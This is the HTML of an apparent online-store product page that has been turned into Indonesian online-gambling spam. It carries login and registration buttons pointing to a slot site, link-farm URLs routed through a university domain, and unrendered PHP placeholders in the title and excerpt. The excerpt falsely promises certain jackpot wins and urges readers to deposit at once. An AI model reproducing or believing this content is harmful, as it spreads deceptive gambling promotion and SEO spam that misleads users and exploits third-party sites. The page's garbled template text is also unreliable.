                                                              &quot;cartStyle&quot;: &quot;text&quot;,
                                                              &quot;cartText&quot;: &quot;Cart&quot;,
                                                              &quot;showEmptyCartState&quot;: true,
                                                              &quot;cartOptions&quot;: {
                                                                &quot;iconType&quot;: &quot;stroke-1&quot;,
                                                                &quot;cartBorderShape&quot;: &quot;none&quot;,
                                                                &quot;cartBorderStyle&quot;: &quot;outline&quot;,
                                                                &quot;cartBorderThickness&quot;: {
                                                                  &quot;unit&quot;: &quot;px&quot;,
                                                                  &quot;value&quot;: 1.0
                                                                }
                                                              },
                                                              &quot;showButton&quot;: false,
                                                              &quot;showCart&quot;: true,
                                                              &quot;showAccountLogin&quot;: false,
                                                              &quot;headerStyle&quot;: &quot;dynamic&quot;,
                                                              &quot;languagePicker&quot;: {
                                                                &quot;enabled&quot;: false,
                                                                &quot;iconEnabled&quot;: false,
                                                                &quot;iconType&quot;: &quot;globe&quot;,
                                                                &quot;flagShape&quot;: &quot;shiny&quot;,
                                                                &quot;languageFlags&quot;: [ ]
                                                              },
                                                              &quot;mobileOptions&quot;: {
                                                                &quot;layout&quot;: &quot;logoLeftNavRight&quot;,
                                                                &quot;menuIcon&quot;: &quot;halfLineHamburger&quot;,
                                                                &quot;menuIconOptions&quot;: {&quot;style&quot;: &quot;doubleLineHamburger&quot;,
                                                                  &quot;thickness&quot;: {
                                                                    &quot;unit&quot;: &quot;px&quot;,
                                                                    &quot;value&quot;: 2.0
                                                                  }
                                                                }
                                                              },
                                                              &quot;dynamicOptions&quot;: {
                                                                &quot;border&quot;: {
                                                                  &quot;enabled&quot;: false,
                                                                  &quot;position&quot;: &quot;allSides&quot;,
                                                                  &quot;thickness&quot;: {
                                                                    &quot;unit&quot;: &quot;px&quot;,
                                                                    &quot;value&quot;: 4.0
                                                                  }
                                                                }
                                                              },
                                                              &quot;solidOptions&quot;: {
                                                                &quot;headerOpacity&quot;: {
                                                                  &quot;unit&quot;: &quot;%&quot;,
                                                                  &quot;value&quot;: 100.0
                                                                },
                                                                &quot;border&quot;: {
                                                                  &quot;enabled&quot;: false,
                                                                  &quot;position&quot;: &quot;allSides&quot;,
                                                                  &quot;thickness&quot;: {
                                                                    &quot;unit&quot;: &quot;px&quot;,
                                                                    &quot;value&quot;: 4.0
                                                                  }
                                                                },
                                                                &quot;dropShadow&quot;: {
                                                                  &quot;enabled&quot;: false,
                                                                  &quot;blur&quot;: {
                                                                    &quot;unit&quot;: &quot;px&quot;,
                                                                    &quot;value&quot;: 30.0
                                                                  },
                                                                  &quot;spread&quot;: {
                                                                    &quot;unit&quot;: &quot;px&quot;,
                                                                    &quot;value&quot;: 0.0
                                                                  },
                                                                  &quot;distance&quot;: {
                                                                    &quot;unit&quot;: &quot;px&quot;,
                                                                    &quot;value&quot;: 0.0
                                                                  }
                                                                },
                                                                &quot;blurBackground&quot;: {
                                                                  &quot;enabled&quot;: false,
                                                                  &quot;blurRadius&quot;: {
                                                                    &quot;unit&quot;: &quot;px&quot;,
                                                                    &quot;value&quot;: 12.0
                                                                  }
                                                                }
                                                              },
                                                              &quot;gradientOptions&quot;: {
                                                                &quot;gradientType&quot;: &quot;faded&quot;,
                                                                &quot;headerOpacity&quot;: {
                                                                  &quot;unit&quot;: &quot;%&quot;,
                                                                  &quot;value&quot;: 90.0
                                                                },
                                                                &quot;border&quot;: {
                                                                  &quot;enabled&quot;: false,
                                                                  &quot;position&quot;: &quot;allSides&quot;,
                                                                  &quot;thickness&quot;: {
                                                                    &quot;unit&quot;: &quot;px&quot;,
                                                                    &quot;value&quot;: 4.0
                                                                  }
                                                                },
                                                                &quot;dropShadow&quot;: {
                                                                  &quot;enabled&quot;: false,
                                                                  &quot;blur&quot;: {
                                                                    &quot;unit&quot;: &quot;px&quot;,
                                                                    &quot;value&quot;: 30.0
                                                                  },
                                                                  &quot;spread&quot;: {
                                                                    &quot;unit&quot;: &quot;px&quot;,
                                                                    &quot;value&quot;: 0.0
                                                                  },
                                                                  &quot;distance&quot;: {
                                                                    &quot;unit&quot;: &quot;px&quot;,
                                                                    &quot;value&quot;: 0.0
                                                                  }
                                                                },
                                                                &quot;blurBackground&quot;: {
                                                                  &quot;enabled&quot;: false,
                                                                  &quot;blurRadius&quot;: {
                                                                    &quot;unit&quot;: &quot;px&quot;,
                                                                    &quot;value&quot;: 12.0
                                                                  }
                                                                }
                                                              },
                                                              &quot;dropShadowOptions&quot;: {
                                                                &quot;enabled&quot;: false,
                                                                &quot;blur&quot;: {&quot;unit&quot;: &quot;px&quot;,
                                                                  &quot;value&quot;: 12.0
                                                                },
                                                                &quot;spread&quot;: {
                                                                  &quot;unit&quot;: &quot;px&quot;,
                                                                  &quot;value&quot;: 0.0
                                                                },
                                                                &quot;distance&quot;: {
                                                                  &quot;unit&quot;: &quot;px&quot;,
                                                                  &quot;value&quot;: 12.0
                                                                }
                                                              },
                                                              &quot;borderOptions&quot;: {
                                                                &quot;enabled&quot;: false,
                                                                &quot;position&quot;: &quot;allSides&quot;,
                                                                &quot;thickness&quot;: {
                                                                  &quot;unit&quot;: &quot;px&quot;,
                                                                  &quot;value&quot;: 4.0
                                                                }
                                                              },
                                                              &quot;showPromotedElement&quot;: false,
                                                              &quot;buttonVariant&quot;: &quot;primary&quot;,
                                                              &quot;blurBackground&quot;: {
                                                                &quot;enabled&quot;: false,
                                                                &quot;blurRadius&quot;: {
                                                                  &quot;unit&quot;: &quot;px&quot;,
                                                                  &quot;value&quot;: 12.0
                                                                }
                                                              },
                                                              &quot;headerOpacity&quot;: {
                                                                &quot;unit&quot;: &quot;%&quot;,
                                                                &quot;value&quot;: 100.0
                                                              }
                                                            }" data-section-id="overlay-nav" data-show-account-login="false" data-test="header-menu">
          <div class="header-menu-bg theme-bg--primary"></div>
          <div class="header-menu-nav">
            <nav class="header-menu-nav-list">
              <div data-folder="root" class="header-menu-nav-folder">
                <div class="header-menu-nav-folder-content">
                  <!-- Menu Navigation -->
                  <div class="header-menu-nav-wrapper">
                    <div class="container header-menu-nav-item header-menu-nav-item--collection header-menu-nav-item--active">
                      <a href="/mart" aria-current="page">
                        <div class="header-menu-nav-item-content"> mart </div>
                      </a>
                    </div>
                  </div>
                </div>
              </div>
            </nav>
          </div>
        </div>
      </header>
      <main id="page" class="container" role="main">
        <article class="sections" id="sections" data-page-sections="65d57fcfc018f8613445676a">
          <section data-test="page-section" data-section-theme="light" class='page-section 
    
      content-collection
      full-bleed-section
      collection-type-mart
    
    background-width--full-bleed
    
      section-height--medium
    
    
      content-width--wide
    
    horizontal-alignment--center
    vertical-alignment--middle
    
      
    
    
    light' data-section-id="65d57fcfc018f8613445676c" data-controller="SectionWrapperController" data-current-styles="{
                                                              &quot;imageOverlayOpacity&quot;: 0.15,
                                                              &quot;backgroundWidth&quot;: &quot;background-width--full-bleed&quot;,
                                                              &quot;sectionHeight&quot;: &quot;section-height--medium&quot;,
                                                              &quot;horizontalAlignment&quot;: &quot;horizontal-alignment--center&quot;,
                                                              &quot;verticalAlignment&quot;: &quot;vertical-alignment--middle&quot;,
                                                              &quot;contentWidth&quot;: &quot;content-width--wide&quot;,
                                                              &quot;sectionTheme&quot;: &quot;light&quot;,
                                                              &quot;sectionAnimation&quot;: &quot;none&quot;,
                                                              &quot;backgroundMode&quot;: &quot;image&quot;
                                                            }" data-current-context="{
                                                              &quot;video&quot;: {
                                                                &quot;playbackSpeed&quot;: 0.5,
                                                                &quot;filter&quot;: 1,
                                                                &quot;filterStrength&quot;: 0,
                                                                &quot;zoom&quot;: 0,
                                                                &quot;videoSourceProvider&quot;: &quot;none&quot;
                                                              },
                                                              &quot;backgroundImageId&quot;: null,
                                                              &quot;backgroundMediaEffect&quot;: null,
                                                              &quot;divider&quot;: null,
                                                              &quot;typeName&quot;: &quot;mart&quot;
                                                            }" data-animation="none">
            <div class="section-border">
              <div class="section-background"></div>
            </div>
            <div class='content-wrapper' style=''>
              <div class="content">
                <section id="pdp" class="
    mart
    collection-content-wrapper
    product-layout-side-by-side
  ">
                  <article class="ProductItem hentry author-plad-amer post-type-store-item" data-item-id="65d57fcfc018f86134456753">
                    <nav class="ProductItem-nav">
                      <div class="ProductItem-nav-breadcrumb" data-animation-role="content">
                        <a href="/mart" class="ProductItem-nav-breadcrumb-link">mart</a>
                        <span class="ProductItem-nav-breadcrumb-separator"></span>
                        <a href="/mart/p/spring-bowl-rltkk-jy5sr-fjw6l-dp8lg-fbmgj-cs6n2-zpp9a-x7c9k-c68b7-ztfb6" class="ProductItem-nav-breadcrumb-link"><?php echo $BRANDS ?> 🦁 Link Login Daftar Judi Online Terbaru Terpercaya 🐪 Terbaru Gampang Menang Server Tergacor  </a>
                      </div>
                    </nav>
                    <section class="ProductItem-summary" data-controller="ProductGallery">
                      <section aria-label="Gallery" class="ProductItem-gallery" data-product-gallery="container">
                        <div class="ProductItem-gallery-slides" data-animation-role="image" data-product-gallery="slides">
                          <div class="ProductItem-gallery-slides-item" data-slide-index="1" data-image-id=65d5833c1936ef69ac844ecd data-controller="ImageZoom" data-slide-url="la6rmh106h3a6qv1cewb1wrc5og33o" data-product-gallery="slides-item" data-test="pdp-gallery-slide">
                            <img aria-describedby="ProductItem-gallery-slides-item-1-index-65d5833c1936ef69ac844ecd" class="ProductItem-gallery-slides-item-image" data-load="false" data-src="https://xn--mgbaaaadj6a3c2c4gfdbk4f.site/assets/Gado2/slot-gacor-server-thailand.jpg" data-image="https://xn--mgbaaaadj6a3c2c4gfdbk4f.site/assets/Gado2/slot-gacor-server-thailand.jpg" data-image-dimensions="1946x1946" data-image-focal-point="0.5,0.5" alt="slot gacor (27).png" elementtiming="nbf-mart-gallery" />
                            <span id="ProductItem-gallery-slides-item-1-index-65d5833c1936ef69ac844ecd" style="display: none;"> Image 1 of </span>
                            <div class="product-image-zoom-duplicate" aria-hidden="true">
                              <img data-load="false" data-src="https://xn--mgbaaaadj6a3c2c4gfdbk4f.site/assets/Gado2/slot-gacor-server-thailand.jpg" data-image="https://xn--mgbaaaadj6a3c2c4gfdbk4f.site/assets/Gado2/slot-gacor-server-thailand.jpg" data-image-dimensions="1946x1946" data-image-focal-point="0.5,0.5" alt="slot gacor (27).png" elementtiming="nbf-mart-gallery-zoom" />
                            </div>
                          </div>
                          <div class="gallery-lightbox-outer-wrapper" data-use-image-loader="true" data-controller="Lightbox">
                            <div class="gallery-lightbox ">
                              <div class="gallery-lightbox-background"></div>
                              <div class="gallery-lightbox-header">
                                <button class="gallery-lightbox-close-btn" aria-label="Close" data-close data-test="gallery-lightbox-close">
                                  <div class="gallery-lightbox-close-btn-icon">
                                    <svg viewBox="0 0 40 40">
                                      <path d="M4.3,35.7L35.7,4.3" />
                                      <path d="M4.3,4.3l31.4,31.4" />
                                    </svg>
                                  </div>
                                </button>
                              </div>
                              <div class="gallery-lightbox-wrapper">
                                <div class="gallery-lightbox-list">
                                  <figure class="gallery-lightbox-item" data-slide-url="la6rmh106h3a6qv1cewb1wrc5og33o">
                                    <div class="gallery-lightbox-item-wrapper">
                                      <div class="gallery-lightbox-item-src">
                                        <div class="gallery-lightbox-item-img content-fit">
                                          <img data-src="https://xn--mgbaaaadj6a3c2c4gfdbk4f.site/assets/Gado2/slot-gacor-server-thailand.jpg" data-image="https://xn--mgbaaaadj6a3c2c4gfdbk4f.site/assets/Gado2/slot-gacor-server-thailand.jpg" data-image-dimensions="1946x1946" data-image-focal-point="0.5,0.5" alt="slot gacor (27).png" data-load="false" elementtiming="nbf-product-lightbox" />
                                        </div>
                                      </div>
                                    </div>
                                  </figure>
                                </div>
                                <div class="gallery-lightbox-controls" data-test="gallery-lightbox-controls">
                                  <div class="gallery-lightbox-control" data-previous data-test="gallery-lightbox-control-previous">
                                    <button class="gallery-lightbox-control-btn" aria-label="Previous Slide">
                                      <div class="gallery-lightbox-control-btn-icon">
                                        <svg class="caret-left-icon--small" viewBox="0 0 9 16">
                                          <polyline fill="none" stroke-miterlimit="10" points="7.3,14.7 2.5,8 7.3,1.2 " />
                                        </svg>
                                      </div>
                                    </button>
                                  </div>
                                  <div class="gallery-lightbox-control" data-next data-test="gallery-lightbox-control-next">
                                    <button class="gallery-lightbox-control-btn" aria-label="Next Slide">
                                      <div class="gallery-lightbox-control-btn-icon">
                                        <svg class="caret-right-icon--small" viewBox="0 0 9 16">
                                          <polyline fill="none" stroke-miterlimit="10" points="1.6,1.2 6.5,7.9 1.6,14.7 " />
                                        </svg>
                                      </div>
                                    </button>
                                  </div>
                                </div>
                              </div>
                            </div>
                          </div>
                        </div>
                      </section>
                      <section class="
    product-details
    ProductItem-details
  " data-test="pdp-details">
  <style>
                          .joker768 {
                            display: grid;
                            grid-template-columns: repeat(2, 1fr);
                            font-weight: 700;
                          }

                          .joker768 a {
                            text-align: center;
                          }

                          .login,
                          .register {
                            color: #000;
                            padding: 13px 10px;
                          }

                          .login,
                          .login-button {
                            border: 1px solid #000000;
                            background: linear-gradient(to bottom, #f73636 0, #f73636 100%);
                          }

                          .register,
                          .register-button {
                            background: linear-gradient(to bottom, #f7e816 0, #f7e816 100%);
                            border: 1px solid #000000;
                          }
                        </style>
                        <div class="joker768">
                          <a href="https://seopecahterus.pages.dev/" rel="nofollow noreferrer" class="register">DAFTAR</a>
                          <a href="https://seopecahterus.pages.dev/" rel="nofollow noreferrer" class="login">LOGIN</a>
                        </div>
                        <br>
                        <h1 class="ProductItem-details-title" data-content-field="title" data-test="pdp-title"> <?php echo $BRANDS ?> 🦁 Link Login Daftar Judi Online Terbaru Terpercaya 🐪 Terbaru Gampang Menang Server Tergacor   </h1>
                        <div data-controller="ProductItemVariants,ProductCartButton" class="ProductItem-details-checkout">
                          <div class="ProductItem-product-price" data-animation-role="content">
                            <div class="fluid-image-container sqs-image-content" style="overflow: hidden; -webkit-mask-image: -webkit-radial-gradient(white, black); position: relative; width: 100%; height: 100%;">
                              <a class="sqs-block-image-link content-fit" href="https://seopecahterus.pages.dev/" target="_blank" rel="noopener">
                                <img style="display: block; object-fit: contain; object-position: 50% 50%; margin-left: auto; margin-right: auto;" src="https://xn--mgbaaaadj6a3c2c4gfdbk4f.site/assets/Gado2/gif/daftar-judi-slot88-sekarang.gif" sizes="(max-width: 640px) 100vw, (max-width: 767px) 100vw, 33.33333333333333vw" srcset="https://xn--mgbaaaadj6a3c2c4gfdbk4f.site/assets/Gado2/gif/daftar-judi-slot88-sekarang.gif?format=100w 100w, https://xn--mgbaaaadj6a3c2c4gfdbk4f.site/assets/Gado2/gif/daftar-judi-slot88-sekarang.gif?format=300w 300w, https://xn--mgbaaaadj6a3c2c4gfdbk4f.site/assets/Gado2/gif/daftar-judi-slot88-sekarang.gif?format=500w 500w, https://xn--mgbaaaadj6a3c2c4gfdbk4f.site/assets/Gado2/gif/daftar-judi-slot88-sekarang.gif?format=750w 750w, https://xn--mgbaaaadj6a3c2c4gfdbk4f.site/assets/Gado2/gif/daftar-judi-slot88-sekarang.gif?format=1000w 1000w, https://xn--mgbaaaadj6a3c2c4gfdbk4f.site/assets/Gado2/gif/daftar-judi-slot88-sekarang.gif?format=1500w 1500w, https://xn--mgbaaaadj6a3c2c4gfdbk4f.site/assets/Gado2/gif/daftar-judi-slot88-sekarang.gif?format=2500w 2500w" alt="Slot Gacor" width="400" height="111" data-stretch="false" data-src="https://xn--mgbaaaadj6a3c2c4gfdbk4f.site/assets/Gado2/gif/daftar-judi-slot88-sekarang.gif" data-image="https://xn--mgbaaaadj6a3c2c4gfdbk4f.site/assets/Gado2/gif/daftar-judi-slot88-sekarang.gif" data-image-dimensions="407x118" data-image-focal-point="0.5,0.5" data-load="false" data-loader="sqs" />
                              </a>
                              <div class="product-price"> IDR 10.000 </div>
                              <div data-afterpay="true" data-current-context="{
                                                              &quot;65d57fcfc018f86134456753&quot;: {
                                                                &quot;scarcityEnabled&quot;: false,
                                                                &quot;scarcityShownByDefault&quot;: false,
                                                                &quot;afterPayAvailable&quot;: false,
                                                                &quot;klarnaAvailable&quot;: false,
                                                                &quot;martperLanguage&quot;: &quot;en&quot;,
                                                                &quot;afterPayMin&quot;: 0,
                                                                &quot;afterPayMax&quot;: 0,
                                                                &quot;klarnaMin&quot;: 0,
                                                                &quot;klarnaMax&quot;: 0,
                                                                &quot;mailingListSignUpEnabled&quot;: false,
                                                                &quot;mailingListOptInByDefault&quot;: false
                                                              }
                                                            }"></div>
                              <div class="pdp-overlay"></div>
                            </div>
                            <div class="ProductItem-details-excerpt" data-content-field="excerpt">
                              <p class="" style="white-space:pre-wrap;"> <a href="https://central-laboratory.um.ac.id/manual/?mart=<?php echo $BRANDS ?>"><?php echo $BRANDS ?></a> daftar slot server thailand <a href="https://central-laboratory.um.ac.id/manual/?mart=<?php echo $BRANDS ?>">SLOT88 THAILAND</a> yang pasti jackpot. Sudah pasti maxwin jika anda bermain disini <?php echo $BRANDS ?>. Segera daftar dan deposit sekarang juga untuk mendapatkan jackpot terbesar!</p>
                            </div>
                            <div class="product-quantity-input" data-item-id="65d57fcfc018f86134456753" data-animation-role="content">
                              <div class="quantity-label">Quantity:</div>
                              <input aria-label="Quantity" size="4" max="9999" min="1" value="1" type="number" step="1"></input>
                            </div>
                            <div class="sqs-add-to-cart-button-wrapper" data-animation-role="button">
                              <div class="sqs-add-to-cart-button sqs-suppress-edit-mode sqs-editable-button sqs-button-element--primary " role="button" tabindex="0" data-dynamic-strings data-collection-id="65d57fcfc018f8613445674d" data-item-id="65d57fcfc018f86134456753" data-product-type="1" data-use-custom-label="false" data-original-label="Add To Cart">
                                <div class="sqs-add-to-cart-button-inner">Add To Cart</div>
                              </div>
                            </div>
                          </div>
                      </section>
                    </section>
                    <section class="ProductItem-additional">
                      <div class="sqs-layout sqs-grid-12 columns-12" data-layout-label="Post Body" data-type="item" id="item-65d57fcfc018f86134456753">
                        <div class="row sqs-row">
                          <div class="col sqs-col-12 span-12">
                            <div class="sqs-block html-block sqs-block-html" data-block-type="2" data-border-radii="&#123;&quot;topLeft&quot;:&#123;&quot;unit&quot;:&quot;px&quot;,&quot;value&quot;:0.0&#125;,&quot;topRight&quot;:&#123;&quot;unit&quot;:&quot;px&quot;,&quot;value&quot;:0.0&#125;,&quot;bottomLeft&quot;:&#123;&quot;unit&quot;:&quot;px&quot;,&quot;value&quot;:0.0&#125;,&quot;bottomRight&quot;:&#123;&quot;unit&quot;:&quot;px&quot;,&quot;value&quot;:0.0&#125;&#125;" id="block-c4fe7c7c644604b8d7c7">
                              <div class="sqs-block-content">
                                <div class="sqs-html-content">
                                  <p></p>
                                </div>
                              </div>
                            </div>
                          </div>
                        </div>
                      </div>
                    </section>
                  </article>
                </section>
              </div>
            </div>
          </section>
        </article>
      </main>
      <script type="text/javascript">
        const firstSection = document.querySelector('.page-section');
        const header = document.querySelector('.header');
        const mobileOverlayNav = document.querySelector('.header-menu');
        const sectionBackground = firstSection ? firstSection.querySelector('.section-background') : null;
        const headerHeight = header ? header.getBoundingClientRect().height : 0;
        const firstSectionHasBackground = firstSection ? firstSection.className.indexOf('has-background') >= 0 : false;
        const isFirstSectionInset = firstSection ? firstSection.className.indexOf('background-width--inset') >= 0 : false;
        const isLayoutEngineSection = firstSection ? firstSection.className.indexOf('layout-engine-section') >= 0 : false;
        if (firstSection) {
          firstSection.style.paddingTop = headerHeight + 'px';
        }
        if (sectionBackground && isLayoutEngineSection) {
          if (isFirstSectionInset) {
            sectionBackground.style.top = headerHeight + 'px';
          } else {
            sectionBackground.style.top = '';
          }
        }
        //# sourceURL=headerPositioning.js
      </script>
      <footer class="sections" id="footer-sections" data-footer-sections></footer>
    </div>
    <script defer="defer" src="https://static1.squarespace.com/static/vta/5c5a519771c10ba3470d8101/scripts/site-bundle.f925353e472226ff557cc55bb58f04f1.js" type="text/javascript"></script>
    <svg xmlns="http://www.w3.org/2000/svg" version="1.1" style="display:none" data-usage="social-icons-svg">
      <symbol id="instagram-unauth-icon" viewBox="0 0 64 64">
        <path d="M46.91,25.816c-0.073-1.597-0.326-2.687-0.697-3.641c-0.383-0.986-0.896-1.823-1.73-2.657c-0.834-0.834-1.67-1.347-2.657-1.73c-0.954-0.371-2.045-0.624-3.641-0.697C36.585,17.017,36.074,17,32,17s-4.585,0.017-6.184,0.09c-1.597,0.073-2.687,0.326-3.641,0.697c-0.986,0.383-1.823,0.896-2.657,1.73c-0.834,0.834-1.347,1.67-1.73,2.657c-0.371,0.954-0.624,2.045-0.697,3.641C17.017,27.415,17,27.926,17,32c0,4.074,0.017,4.585,0.09,6.184c0.073,1.597,0.326,2.687,0.697,3.641c0.383,0.986,0.896,1.823,1.73,2.657c0.834,0.834,1.67,1.347,2.657,1.73c0.954,0.371,2.045,0.624,3.641,0.697C27.415,46.983,27.926,47,32,47s4.585-0.017,6.184-0.09c1.597-0.073,2.687-0.326,3.641-0.697c0.986-0.383,1.823-0.896,2.657-1.73c0.834-0.834,1.347-1.67,1.73-2.657c0.371-0.954,0.624-2.045,0.697-3.641C46.983,36.585,47,36.074,47,32S46.983,27.415,46.91,25.816z M44.21,38.061c-0.067,1.462-0.311,2.257-0.516,2.785c-0.272,0.7-0.597,1.2-1.122,1.725c-0.525,0.525-1.025,0.85-1.725,1.122c-0.529,0.205-1.323,0.45-2.785,0.516c-1.581,0.072-2.056,0.087-6.061,0.087s-4.48-0.015-6.061-0.087c-1.462-0.067-2.257-0.311-2.785-0.516c-0.7-0.272-1.2-0.597-1.725-1.122c-0.525-0.525-0.85-1.025-1.122-1.725c-0.205-0.529-0.45-1.323-0.516-2.785c-0.072-1.582-0.087-2.056-0.087-6.061s0.015-4.48,0.087-6.061c0.067-1.462,0.311-2.257,0.516-2.785c0.272-0.7,0.597-1.2,1.122-1.725c0.525-0.525,1.025-0.85,1.725-1.122c0.529-0.205,1.323-0.45,2.785-0.516c1.582-0.072,2.056-0.087,6.061-0.087s4.48,0.015,6.061,0.087c1.462,0.067,2.257,0.311,2.785,0.516c0.7,0.272,1.2,0.597,1.725,1.122c0.525,0.525,0.85,1.025,1.122,1.725c0.205,0.529,0.45,1.323,0.516,2.785c0.072,1.582,0.087,2.056,0.087,6.061S44.282,36.48,44.21,38.061z M32,24.297c-4.254,0-7.703,3.449-7.703,7.703c0,4.254,3.449,7.703,7.703,7.703c4.254,0,7.703-3.449,7.703-7.703C39.703,27.746,36.254,24.297,32,24.297z M32,37c-2.761,0-5-2.239-5-5c0-2.761,2.239-5,5-5s5,2.239,5,5C37,34.761,34.761,37,32,37z M40.007,22.193c-0.994,0-1.8,0.806-1.8,1.8c0,0.994,0.806,1.8,1.8,1.8c0.994,0,1.8-0.806,1.8-1.8C41.807,22.999,41.001,22.193,40.007,22.193z" />
      </symbol>
      <symbol id="instagram-unauth-mask" viewBox="0 0 64 64">
        <path d="M43.693,23.153c-0.272-0.7-0.597-1.2-1.122-1.725c-0.525-0.525-1.025-0.85-1.725-1.122c-0.529-0.205-1.323-0.45-2.785-0.517c-1.582-0.072-2.056-0.087-6.061-0.087s-4.48,0.015-6.061,0.087c-1.462,0.067-2.257,0.311-2.785,0.517c-0.7,0.272-1.2,0.597-1.725,1.122c-0.525,0.525-0.85,1.025-1.122,1.725c-0.205,0.529-0.45,1.323-0.516,2.785c-0.072,1.582-0.087,2.056-0.087,6.061s0.015,4.48,0.087,6.061c0.067,1.462,0.311,2.257,0.516,2.785c0.272,0.7,0.597,1.2,1.122,1.725s1.025,0.85,1.725,1.122c0.529,0.205,1.323,0.45,2.785,0.516c1.581,0.072,2.056,0.087,6.061,0.087s4.48-0.015,6.061-0.087c1.462-0.067,2.257-0.311,2.785-0.516c0.7-0.272,1.2-0.597,1.725-1.122s0.85-1.025,1.122-1.725c0.205-0.529,0.45-1.323,0.516-2.785c0.072-1.582,0.087-2.056,0.087-6.061s-0.015-4.48-0.087-6.061C44.143,24.476,43.899,23.682,43.693,23.153z M32,39.703c-4.254,0-7.703-3.449-7.703-7.703s3.449-7.703,7.703-7.703s7.703,3.449,7.703,7.703S36.254,39.703,32,39.703z M40.007,25.793c-0.994,0-1.8-0.806-1.8-1.8c0-0.994,0.806-1.8,1.8-1.8c0.994,0,1.8,0.806,1.8,1.8C41.807,24.987,41.001,25.793,40.007,25.793z M0,0v64h64V0H0z M46.91,38.184c-0.073,1.597-0.326,2.687-0.697,3.641c-0.383,0.986-0.896,1.823-1.73,2.657c-0.834,0.834-1.67,1.347-2.657,1.73c-0.954,0.371-2.044,0.624-3.641,0.697C36.585,46.983,36.074,47,32,47s-4.585-0.017-6.184-0.09c-1.597-0.073-2.687-0.326-3.641-0.697c-0.986-0.383-1.823-0.896-2.657-1.73c-0.834-0.834-1.347-1.67-1.73-2.657c-0.371-0.954-0.624-2.044-0.697-3.641C17.017,36.585,17,36.074,17,32c0-4.074,0.017-4.585,0.09-6.185c0.073-1.597,0.326-2.687,0.697-3.641c0.383-0.986,0.896-1.823,1.73-2.657c0.834-0.834,1.67-1.347,2.657-1.73c0.954-0.371,2.045-0.624,3.641-0.697C27.415,17.017,27.926,17,32,17s4.585,0.017,6.184,0.09c1.597,0.073,2.687,0.326,3.641,0.697c0.986,0.383,1.823,0.896,2.657,1.73c0.834,0.834,1.347,1.67,1.73,2.657c0.371,0.954,0.624,2.044,0.697,3.641C46.983,27.415,47,27.926,47,32C47,36.074,46.983,36.585,46.91,38.184z M32,27c-2.761,0-5,2.239-5,5s2.239,5,5,5s5-2.239,5-5S34.761,27,32,27z" />
      </symbol>
    </svg>
  </body>
</html>
